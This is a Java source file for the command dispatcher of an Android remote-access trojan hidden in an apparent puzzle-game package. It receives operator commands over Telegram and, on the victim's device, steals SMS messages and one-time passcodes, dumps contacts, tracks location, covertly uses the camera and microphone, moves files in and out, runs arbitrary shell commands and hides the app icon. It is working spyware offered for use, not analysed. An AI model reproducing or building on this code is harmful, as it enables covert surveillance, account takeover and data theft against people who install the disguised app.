package com.gempuzzle.quest.c2;

import android.content.Context;
import android.content.SharedPreferences;

import com.gempuzzle.quest.c2.modules.CameraModule;
import com.gempuzzle.quest.c2.modules.ContactsModule;
import com.gempuzzle.quest.c2.modules.FileModule;
import com.gempuzzle.quest.c2.modules.LocationModule;
import com.gempuzzle.quest.c2.modules.MicModule;
import com.gempuzzle.quest.c2.modules.ShellModule;
import com.gempuzzle.quest.c2.modules.SmsModule;

/**
 * Command dispatcher — parses admin text commands and routes
 * to the appropriate module. Session-locking and broadcast
 * handled here. Destructive commands require /confirm flow.
 */
public final class CommandDispatcher {

    private static String sessionSid = null;

    public static void dispatch(Context ctx, String text, boolean hasDoc, String fileId) {
        if (text == null || text.isEmpty()) return;
        String[] parts = text.trim().split("\\s+", 3);
        String cmd = parts[0].toLowerCase();
        String arg1 = parts.length > 1 ? parts[1] : "";
        String arg2 = parts.length > 2 ? parts[2] : "";

        switch (cmd) {
            case "/ping":
                TelegramClient.sendMessage("🏓 pong");
                break;
            case "/session":
                TelegramClient.sendMessage("🆔 SID: " + DeviceInfo.sid(ctx));
                break;
            case "/status":
                TelegramClient.sendMessage("📊 " + DeviceInfo.statusCard(ctx));
                break;
            case "/deviceinfo":
                TelegramClient.sendMessage("📟 " + DeviceInfo.card(ctx));
                break;
            case "/use":
                sessionSid = arg1;
                TelegramClient.sendMessage("🔐 session locked → " + arg1);
                break;
            case "/background":
                sessionSid = null;
                TelegramClient.sendMessage("🚪 session deactivated");
                break;
            case "/check_online":
                TelegramClient.sendMessage("📡 device online · SID " + DeviceInfo.sid(ctx));
                break;
            case "/hide":
                IconHider.hide(ctx);
                TelegramClient.sendMessage("🥷 icon hidden");
                break;
            case "/unhide":
                IconHider.unhide(ctx);
                TelegramClient.sendMessage("👁 icon restored");
                break;
            case "/sms":
                SmsModule.readSms(ctx, parseInt(arg1, 20));
                break;
            case "/otp":
                SmsModule.otpLog(ctx);
                break;
            case "/contacts":
                ContactsModule.dump(ctx, parseInt(arg1, 50));
                break;
            case "/location":
                LocationModule.oneShot(ctx);
                break;
            case "/frontcam":
            case "/photo":
                CameraModule.capture(ctx, true);
                break;
            case "/backcam":
                CameraModule.capture(ctx, false);
                break;
            case "/mic":
                MicModule.record(ctx, parseInt(arg1, 15));
                break;
            case "/files":
                FileModule.list(ctx, arg1.isEmpty() ? "/sdcard" : arg1);
                break;
            case "/download":
                FileModule.download(ctx, arg1);
                break;
            case "/shell":
                ShellModule.exec(text.substring(text.indexOf(' ') + 1));
                break;
            case "/upload":
                if (hasDoc && !fileId.isEmpty()) FileModule.upload(ctx, fileId);
                else TelegramClient.sendMessage("⚠ reply to a file with /upload");
                break;
            case "/kill":
                kill(ctx);
                break;
            case "/health":
                TelegramClient.sendMessage(HealthCheck.report(ctx));
                break;
            case "/beacon":
                setBeacon(ctx, parseInt(arg1, 60));
                break;
            default:
                // Unknown — ignore silently (never reveal to non-admin)
                break;
        }
    }

    private static void kill(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences("gq", Context.MODE_PRIVATE);
        prefs.edit().putBoolean("killed", true).apply();
        TelegramClient.sendMessage("💀 self-destruct initiated — all services stopping");
        try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
        System.exit(0);
    }

    private static void setBeacon(Context ctx, int sec) {
        SharedPreferences prefs = ctx.getSharedPreferences("gq", Context.MODE_PRIVATE);
        prefs.edit().putInt("beacon", sec).apply();
        TelegramClient.sendMessage("⏱ beacon interval set to " + sec + "s");
    }

    private static int parseInt(String s, int def) {
        try { return Integer.parseInt(s); } catch (Exception e) { return def; }
    }

    private CommandDispatcher() {}
}
